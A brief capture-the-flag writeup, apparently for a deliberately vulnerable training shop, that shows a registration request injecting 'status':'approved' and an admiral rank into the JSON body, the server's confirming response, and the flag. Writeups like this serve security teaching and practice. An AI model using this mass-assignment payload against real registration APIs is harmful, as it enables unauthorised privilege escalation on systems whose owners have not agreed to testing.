# CTF Writeup: JSON Attribute Injection

## Challenge: JSON Attribute Injection

### Exploit:
The registration API allowed injecting attributes to set user status to approved.

### Request:
```
POST /api/register HTTP/2
Host: juice-shop-vopb.onrender.com
Content-Length: 152
Sec-Ch-Ua-Platform: "Windows"
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Sec-Ch-Ua: "Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"
Content-Type: application/json
Sec-Ch-Ua-Mobile: ?0
Accept: */*
Origin: https://juice-shop-vopb.onrender.com
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://juice-shop-vopb.onrender.com/register
Accept-Encoding: gzip, deflate, br
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Dnt: 1
Sec-Gpc: 1
Priority: u=1, i

{"attributes":{"email":"s@m.com","missionReason":"hack",
"status":"approved"},"relationships":{"ranks":{"data":[{"type":"rank","id":"fleetAdmiral"}]}}}
```

### Response:
```
HTTP/2 201 Created
Date: Wed, 26 Mar 2025 03:41:44 GMT
Content-Type: application/json
Content-Length: 104
Rndr-Id: 0476543c-bbe5-407b
Vary: Accept-Encoding
X-Render-Origin-Server: gunicorn
Cf-Cache-Status: DYNAMIC
Server: cloudflare
Cf-Ray: 9263a24edc238b0f-BOM
Alt-Svc: h3=":443"; ma=86400

{"message":"Registration created","status":"approved","user_id":"dd9f55e9-70cb-42e2-b30d-05a99f6876ba"}
```

### Flag:
```
CTF{straw_hat_admin_bypass}
```

